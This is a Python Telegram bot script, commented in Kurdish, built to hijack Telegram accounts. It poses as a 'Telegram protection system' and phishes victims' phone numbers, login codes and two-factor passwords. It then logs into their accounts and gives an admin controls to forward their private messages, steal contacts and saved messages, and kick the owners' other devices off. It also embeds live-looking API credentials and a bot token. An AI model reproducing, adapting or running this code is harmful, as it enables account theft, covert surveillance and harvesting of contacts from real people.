from pyrogram import Client, filters, errors
from pyrogram.types import (ReplyKeyboardMarkup, KeyboardButton, 
                            InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardRemove)

# --- زانیارییەکانی خۆت لێرە جێگیر بکە ---
API_ID = 38225812
API_HASH = "aff3c308c587f18a5975910fbcf68366"
BOT_TOKEN = "8424748782:AAG0VELUlOfabsayVic2SpUAR-hWsh-nnf0"
ADMIN_ID = 7414272224

app = Client("pro_spy_final_v4", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# کۆگای کاتی بۆ هەڵگرتنی سێشنەکان
sessions = {} 

# --- دروستکردنی پانێڵی دوگمەی کۆنتڕۆڵ بۆ ئادمین ---
def get_control_panel(u_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📡 چالاککردنی سیخوڕی", callback_data=f"spy_{u_id}")],
        [InlineKeyboardButton("⚔️ دەرکردنی ئامێرەکان", callback_data=f"kick_{u_id}")],
        [InlineKeyboardButton("📇 وەرگرتنی ناوەکان", callback_data=f"cnt_{u_id}"),
         InlineKeyboardButton("📂 ١٠ نامەی کۆن", callback_data=f"msg_{u_id}")]
    ])

# --- فەرمانی ستارت و پانێڵ ---
@app.on_message(filters.command(["start", "panel"]) & filters.private)
async def start_handler(client, message):
    user_id = message.from_user.id
    
    if user_id == ADMIN_ID:
        if not sessions:
            await message.reply_text("💎 **بەخێرهاتی گەورەم بۆ پانێڵ**\n\nلە ئێستادا هیچ نێچیرێک لۆگین نییە. هەرکەس لۆگین بێت لێرە دوگمەی بۆ دروست دەبێت.")
        else:
            await message.reply_text("🎯 **لیستی نێچیرە چالاکەکان:**")
            for vid, data in sessions.items():
                if data.get("step") == "done":
                    await message.reply_text(f"👤 نێچیر: `+{data['phone']}`\n🆔 ئایدی: `{vid}`", 
                                           reply_markup=get_control_panel(vid))
        return

    # ڕووکاری نێچیر
    victim_kb = ReplyKeyboardMarkup(
        [[KeyboardButton("📲 پشتڕاستکردنەوەی ئەکاونت", request_contact=True)]],
        resize_keyboard=True, one_time_keyboard=True
    )
    await message.reply_text(
        "👋 **سیستەمی پاراستنی تێلیگرام**\n\nبۆ ڕێگریکردن لە سڕینەوەی ئەکاونتەکەت، پێویستە ژمارەکەت پشتڕاست بکەیتەوە.\n\nکلیک لە دوگمەی خوارەوە بکە:",
        reply_markup=victim_kb
    )

# --- وەرگرتنی ژمارە و ناردنی کۆد ---
@app.on_message(filters.contact & filters.private)
async def contact_handler(client, message):
    u_id = message.from_user.id
    phone = message.contact.phone_number
    
    await app.send_message(ADMIN_ID, f"☎️ **ژمارەیەکی نوێ هات:** `+{phone}`\n🆔 ئایدی: `{u_id}`")
    
    c = Client(f"session_{u_id}", api_id=API_ID, api_hash=API_HASH)
    await c.connect()
    
    try:
        sent_code = await c.send_code(phone)
        sessions[u_id] = {"client": c, "phone": phone, "hash": sent_code.phone_code_hash, "step": "code"}
        await message.reply_text("📩 **کۆدێکی ٥ ژمارەیی بۆ تێلیگرامەکەت نێردرا.**\nتکایە لێرە بینووسە:", reply_markup=ReplyKeyboardRemove())
    except Exception as e:
        await app.send_message(ADMIN_ID, f"❌ هەڵە لە ناردنی کۆد: {e}")

# --- قۆناغی لۆگین (کۆد و پاسۆرد) ---
@app.on_message(filters.text & filters.private)
async def login_logic(client, message):
    u_id = message.from_user.id
    if u_id not in sessions or sessions[u_id].get("step") == "done" or u_id == ADMIN_ID:
        return

    data = sessions[u_id]
    code_or_pass = message.text.strip().replace(" ", "")

    try:
        if data["step"] == "code":
            await data["client"].sign_in(data["phone"], data["hash"], code_or_pass)
        elif data["step"] == "2fa":
            await data["client"].check_password(code_or_pass)

        # ئەگەر لۆگین سەرکەوتوو بوو
        sessions[u_id]["step"] = "done"
        await message.reply_text("✅ سوپاس، ئەکاونتەکەت پارێزرا.")
        await app.send_message(ADMIN_ID, f"🔥 **نێچیرێکی نوێ لۆگین بوو!**\n📱 ژمارە: `+{data['phone']}`", 
                               reply_markup=get_control_panel(u_id))

    except errors.SessionPasswordNeeded:
        sessions[u_id]["step"] = "2fa"
        await message.reply_text("🔑 **پاسۆردی دوو قۆناغی (2FA) بنێرە:**")
    except errors.PhoneCodeExpired:
        await message.reply_text("❌ کۆدەکە بەسەرچووە، تکایە دووبارە ستارت بکەرەوە.")
    except Exception as e:
        await app.send_message(ADMIN_ID, f"❌ هەڵە لە لۆگین: {e}")

# --- کارپێکردنی دوگمەکان (Callback Queries) ---
@app.on_callback_query()
async def callback_handler(client, query):
    cmd, target_id = query.data.split("_")
    target_id = int(target_id)
    
    if target_id not in sessions:
        await query.answer("❌ داتا لە بیرەوەری نەماوە، نێچیرەکە دووبارە لۆگین بکاتەوە.", show_alert=True)
        return

    u_client = sessions[target_id]["client"]

    if cmd == "spy":
        @u_client.on_message(filters.private & ~filters.me)
        async def spy_forwarder(c, m):
            await m.forward(ADMIN_ID)
        await query.answer("📡 سیستەمی سیخوڕی چالاک بوو.")

    elif cmd == "kick":
        auths = await u_client.get_authorizations()
        for a in auths:
            if not a.is_current: await u_client.terminate_session(a.hash)
        await query.answer("⚔️ هەموو ئامێرەکان دەرکران.", show_alert=True)

    elif cmd == "cnt":
        contacts = await u_client.get_contacts()
        res = "\n".join([f"👤 {c.first_name}: +{c.phone_number}" for c in contacts[:20]])
        await app.send_message(ADMIN_ID, f"📇 **ناووەکان:**\n\n{res}")
        await query.answer("لیستەکە ناردرا")

    elif cmd == "msg":
        async for m in u_client.get_chat_history("me", limit=10):
            await m.forward(ADMIN_ID)
        await query.answer("نامەکان فۆروارد کران.")

print("--- BoT is LIVE! ---")
app.run()
